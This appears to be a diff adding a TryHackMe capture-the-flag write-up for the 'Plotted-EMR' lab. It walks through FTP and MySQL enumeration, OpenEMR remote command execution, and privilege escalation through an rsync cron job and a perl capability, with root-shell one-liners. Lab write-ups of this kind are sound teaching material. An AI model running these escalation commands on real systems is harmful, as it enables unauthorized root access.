@@ -1,16 +1,19 @@
+# Plotted-EMR — TryHackMe Writeup
 
-
+**Room Name:** Plotted-EMR
+**Room Description:** Everything here is plotted!
+**Room Difficulty:** Hard
 
 ## Recon
 
-Nmap Scan
+### Nmap Scan
 
 ```bash
-╭─░▒▓    ~/tryhackme/Plotted_EMR ▓▒░························································································································░▒▓ ✔  at 04:04:23 PM  ▓▒░─╮
+╭─░▒▓    ~/tryhackme/Plotted_EMR ▓▒░························································································································░▒▓ ✔  at 04:04:23 PM  ▓▒░─╮
 ╰─ sudo nmap -A -O -sC -sV  10.112.140.193 > nmap.scan                                                                                                                                     ─╯
 [sudo] password for ezlx: 
 
-╭─░▒▓    ~/tryhackme/Plotted_EMR ▓▒░···········································································································░▒▓ ✔  took 31s   at 04:05:20 PM  ▓▒░─╮
+╭─░▒▓    ~/tryhackme/Plotted_EMR ▓▒░···········································································································░▒▓ ✔  took 31s   at 04:05:20 PM  ▓▒░─╮
 ╰─ cat nmap.scan                                                                                                                                                                           ─╯
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-06 16:04 +0300
 Nmap scan report for 10.112.140.193
@@ -76,8 +79,137 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 28.10 seconds
-
 ```
 
-As we can see there are 4 open ports and first thing caught my eye is the `Anonymous FTP login allowed`, for the `FTP` protocol on port `21` 
+The scan reveals four open ports. The first thing that stands out is that **anonymous FTP login is allowed** on port 21.
 
+Logging in anonymously on FTP turns up the following:
+
+![](FTPLogin.png)
+
+Running `ls -la` shows three directories. One of them, `.-`, looks unusual. Navigating into it with `cd` reveals another oddly named directory, `...`, which contains a file called `you_are_determined.txt`:
+
+![](FTP_Hint.png)
+
+Inside is a YouTube link and a hint. The video itself turns out to be a troll, but the hint is worth holding onto for later.
+
+## Enumeration
+
+With ports 80 and 5900 still unexplored, I started with the web server.
+
+![](Home_Page.png)
+
+Just the default Apache page — time for directory enumeration.
+
+![](Directory_Enumeration.png)
+
+Of the three directories found, none were useful; the `admin` directory only repeated the hint already found on FTP.
+
+I was also able to log into the MySQL server as `admin` with no password, but didn't find anything of value there either.
+
+![](Mysql_Session.png)
+
+After spending a while stuck, I ran another port scan and found a second HTTP service on port 8890.
+
+![](Home_Page2.png)
+
+Another default landing page, so I ran directory enumeration again.
+
+![](Tryhackme/Plotted_EMR/Attachments/Directory_Enum2.png)
+
+Two directories stand out: `/portal` and `/80`. The `/80` path just redirects back to the first web app, so `/portal` is the one worth investigating.
+
+![](Login%20Page.png)
+
+Running `feroxbuster` against it turns up a number of interesting pages.
+
+![](OpenEMR_Dir_Enum.png)
+
+The important one is `admin.php`, found after some digging.
+
+![](Admin_page.png)
+
+Clicking **Add New Site** leads to `setup.php`, where a new site can be configured.
+
+![](Tryhackme/Plotted_EMR/Attachments/SetUp.png)
+
+Since we already have access to the MySQL server on port 5900 as `admin` with no password, the plan is to create a new OpenEMR site pointed at that database using those credentials:
+
+```txt
+The MYSQL SERVER Options 
+Server Host:{Machine IP}
+Server Port:{The MYSQL Port 5900}
+Login Name:{Anything you want}
+Password:{Anything you want}
+Name for Root Account: {The username in the MYSQL that we have access for}
+
+OPENEMR USER:
+
+Initial User:{Anything you want}
+Initial User Password:{Anything you want}
+```
+
+![](Setup2.png)
+
+![](NewSite.png)
+
+From there, the new site is reachable at:
+`http://10.112.140.193:8890/portal/interface/login/login.php?site=whatever you named your new site`
+
+![](OpenEmr_Access.png)
+
+## Initial Access
+
+While researching OpenEMR exploits, I found this GitHub repo: `https://github.com/CyberQuestor-infosec/CVE-2018-17179-OpenEMR`, which allows remote command execution.
+
+![](POC01.png)
+
+One line in the PoC needed to be adjusted to match our site name:
+
+```python
+r = s.post(args.host + "/interface/main/main_screen.php?auth=login&site=(newone2) < -----------change this", data=login)
+```
+
+![](POC02.png)
+
+![](Initial_Access.png)
+
+With that, we land a shell on the machine as `www-data`.
+
+## Privilege Escalation
+
+Next step is escalating privileges. After some digging, I found a path to the `plot_admin` account via a cron job.
+
+![](Crontab.png)
+
+A scheduled task runs every minute and uses `rsync` to back up everything in the `config` directory — which is exploitable. Normally the backup command looks like this:
+
+```bash
+rsync -t * plot_admin@127.0.0.01:~/backup
+```
+
+But `rsync` can be abused to execute a script instead, by passing the `-e` flag:
+
+```bash
+rsync -t -e sh shell.sh plot_admin@127.0.0.01:~/backup
+```
+
+![](plot_admin.png)
+
+For root, running `linpeas` revealed a `perl` capability, which GTFOBins confirms is exploitable:
+
+```bash
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
+```
+
+or, alternatively:
+
+```bash
+/usr/bin/perl -e 'chmod 7777, "/bin/bash"'
+```
+
+![](Tryhackme/Plotted_EMR/Attachments/Root.png)
+
+![](Root_Flag.png)
+
+And that's root — flag captured.
